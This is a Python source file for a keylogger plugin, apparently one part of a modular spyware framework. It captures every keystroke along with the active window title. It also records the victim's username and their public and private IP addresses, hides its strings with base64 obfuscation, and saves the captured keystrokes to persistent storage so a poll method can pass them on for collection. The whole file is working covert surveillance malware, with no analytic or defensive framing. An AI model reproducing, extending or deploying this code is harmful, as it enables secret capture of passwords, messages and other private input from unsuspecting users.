import os
import time
import socket
import threading
import base64

from pynput.keyboard import Key, Listener
import win32gui

import config
from obfuscation import deobf
from plugins import Plugin
from log_utils import log

_HDR  = "W1NUQVJUIE9GIExPR1Nd"
_FMT  = "ICogIERhdGUvVGltZToge30KICAqICBVc2VyLVByb2ZpbGU6IHt9CiAgKiAgUHVibGljLUlQOiB7fQogICogIFByaXZhdGUtSVA6IHt9Cgo="
_LFMT = "Clt7fV0gfiB7fTog"
_CHNK = "Ci0tLUVORCBPRiBDSFVOSy0tLQo="

def debug_print(msg):
    if config.DEBUG:
        print(msg)

class KeyloggerPlugin(Plugin):
    name = "keylogger"
    interval = 0

    def __init__(self):
        super().__init__()
        self._old_app = ""
        self._pressed_modifiers = set()
        self._listener = None
        self._initial_msg = ""
        self._build_initial_msg()
        if config.LOG_RETENTION:
            self._recover()

    def _recover(self):
        try:
            from storage import SecureStore
            store = SecureStore()
            entries = store.read_pending("keylogger")
            if entries:
                recovered = "\n".join(entries)
                self.buffer += deobf(_CHNK) + "[RECOVERED]\n" + recovered
                log("info", f"Recovered {len(entries)} keylogger entries from storage")
        except Exception as e:
            log("debug", f"Keylogger recovery failed: {e}")

    def _build_initial_msg(self):
        datetime = time.ctime(time.time())
        user = os.path.expanduser("~").split("\\")[2]
        try:
            import requests
            publicIP = requests.get(deobf("aHR0cHM6Ly9hcGkuaXBpZnkub3JnLw=="), timeout=5).text
        except Exception:
            publicIP = "0.0.0.0"
        privateIP = socket.gethostbyname(socket.gethostname())
        self._initial_msg = deobf(_HDR) + deobf(_FMT).format(datetime, user, publicIP, privateIP)
        self.buffer = self._initial_msg

    _MODIFIERS = [Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.cmd]

    _SUBSTITUTION = {
        deobf("S2V5LmVudGVy"): deobf("W0VOVEVSXSA="),
        deobf("S2V5LmJhY2tzcGFjZQ=="): deobf("W0JBQ0tTUEFDRV0g"),
        deobf("S2V5LnNwYWNl"): deobf("IA=="),
        deobf("S2V5LmFsdF9s"): deobf("W0FMVF0g"),
        deobf("S2V5LnRhYg=="): deobf("W1RBRl0g"),
        deobf("S2V5LmRlbGV0ZQ=="): deobf("W0RFTF0g"),
        deobf("S2V5LmN0cmxfbA=="): deobf("W0NUUkxdIA=="),
        deobf("S2V5LmxlZnQ="): deobf("W0xFRlQgQVJST1ddIA=="),
        deobf("S2V5LnJpZ2h0"): deobf("W1JJR0hUIEFSUk9XXSA="),
        deobf("S2V5LnNoaWZ0"): deobf("W1NISUZUXSA="),
        deobf("XHgxMw=="): deobf("W0NUUkwtU10g"),
        deobf("XHgxNw=="): deobf("W0NUUkwtV10g"),
        deobf("S2V5LmNhcHNfbG9jaw=="): deobf("W0NBUFMgTEtdIA=="),
        deobf("XHgwMQ=="): deobf("W0NUUkwtQV0g"),
        deobf("S2V5LmNtZA=="): deobf("W1dJTkRPV1MgS0VZXSA="),
        deobf("S2V5LnByaW50X3NjcmVlbg=="): deobf("W1BSTlQgU0NSXSA="),
        deobf("XHgwMw=="): deobf("W0NUUkwtQ10g"),
        deobf("XHgxNg=="): deobf("W0NUUkwtVl0g"),
    }

    def _on_press(self, key):
        current_time = time.time()
        new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if new_app == deobf("Q29ydGFuYQ=="):
            new_app = deobf("V2luZG93cyBTdGFydCBNZW51")
        if new_app != self._old_app and new_app != "":
            self.buffer += deobf(_LFMT).format(time.ctime(current_time), new_app)
            self._old_app = new_app

        key_str = str(key).strip("'")
        if key in self._MODIFIERS:
            if key not in self._pressed_modifiers:
                self._pressed_modifiers.add(key)
                self.buffer += self._SUBSTITUTION.get(key_str, key_str)
        else:
            self.buffer += self._SUBSTITUTION.get(key_str, key_str)

    def _on_release(self, key):
        if key in self._MODIFIERS:
            self._pressed_modifiers.discard(key)

    def start(self):
        self._listener = Listener(on_press=self._on_press, on_release=self._on_release)
        self._listener.start()
        self._running = True

    def stop(self):
        if self._listener:
            self._listener.stop()
        self._running = False

    def persist_buffer(self):
        if config.LOG_RETENTION and self.buffer != self._initial_msg and self.buffer.strip():
            try:
                from storage import SecureStore
                store = SecureStore()
                extra = self.buffer[len(self._initial_msg):] if self.buffer.startswith(self._initial_msg) else self.buffer
                if extra.strip():
                    store.append("keylogger", extra)
            except Exception as e:
                log("debug", f"Keylogger persist failed: {e}")

    def poll(self):
        if not self.buffer or self.buffer == self._initial_msg:
            return None
        if config.LOG_RETENTION:
            self.persist_buffer()
        data = self.buffer
        self.buffer = self._initial_msg
        return {"type": self.name, "data": data}
